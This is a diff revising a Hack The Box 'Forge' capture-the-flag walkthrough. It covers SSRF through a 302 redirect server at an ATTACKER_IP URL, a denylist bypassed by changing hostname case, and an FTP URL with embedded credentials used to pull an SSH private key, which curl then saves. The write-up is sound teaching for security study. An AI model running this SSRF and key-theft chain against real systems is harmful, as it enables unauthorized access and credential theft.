@@ -85,19 +85,33 @@ class Redirect(BaseHTTPRequestHandler):
 HTTPServer(('0.0.0.0', 80), Redirect).serve_forever()
 ```
 
-Save this as `redirect.py`. This version corrects the `end_response()` typo in the notes to `end_headers()`. It listens on port 80, which needs root, so run it under `sudo`. The URL supplied to the upload form is our server's address, while the command argument is the redirect destination.
+Save this as `redirect.py`. This version corrects the `end_response()` typo in the notes to `end_headers()`. It listens on port 80, which needs root, so run it under `sudo`. The command argument is the redirect destination:
 
 ```bash
 sudo python3 redirect.py http://admin.forge.htb
 ```
 
+The URL we then hand the upload form is our own address, which is not on the denylist:
+
+```text
+http://ATTACKER_IP/
+```
+
+Forge fetches that, gets the 302 back, follows it to `admin.forge.htb`, and stores the admin page as our upload. The retrieval below is the same either way.
+
 Case manipulation was easier to repeat here: edit the target URL in the upload request, then retrieve the resulting file. That let us keep exploring the admin site.
 
 ### Reading a page we are not allowed to load
 
-Submitting the URL gives us a link to the saved upload. Copy that link and send a separate GET request to it in Burp. The body of this second response contains the admin page's HTML. That is what we read for the next endpoint.
+Submitting the URL gives us a link to the saved upload, under `/uploads/` with a generated name. Copy that link and send a separate GET request to it in Burp, or fetch it directly:
 
-Repeat both steps for each new target: submit its URL through the public upload form, then GET the new upload link it returns.
+```bash
+curl http://forge.htb/uploads/GENERATED_NAME
+```
+
+The body of this second response contains the admin page's HTML. That is what we read for the next endpoint.
+
+Repeat both steps for each new target: submit its URL through the public upload form, then GET the new `/uploads/` link it returns. The generated name changes every time, so it has to come from the submission you just made.
 
 This retrieval sequence is also documented in [0xdf's write-up](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#ssrf--redirection-summary). The case-based route to the admin uploader and SSH key is independently described by [evyatar9](https://forum.hackthebox.com/t/forge-writeup-by-evyatar9/250850).
 
@@ -143,9 +157,10 @@ http://ADMIN.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/.ssh/i
 
 This one I submitted through the browser rather than Burp. Burp was returning internal server errors, probably mangling the URL encoding somewhere. Letting the browser build the request and reading the response in Burp worked.
 
-Retrieve the resulting upload as above and save the OpenSSH private key as `id_rsa`. Then connect with it:
+Retrieve the resulting upload as above, saving the body as `id_rsa` rather than reading it in Burp. Then connect with it:
 
 ```bash
+curl http://forge.htb/uploads/GENERATED_NAME -o id_rsa
 chmod 600 id_rsa
 ssh -i id_rsa user@forge.htb
 ```
@@ -232,7 +247,7 @@ Now, at the menu, give it something that is not a number:
 asdf
 ```
 
-The `(pdb)` prompt appears back in **session A**, the one running under `sudo`.
+The `(Pdb)` prompt appears back in **session A**, the one running under `sudo`.
 
 From that `(pdb)` prompt:
 
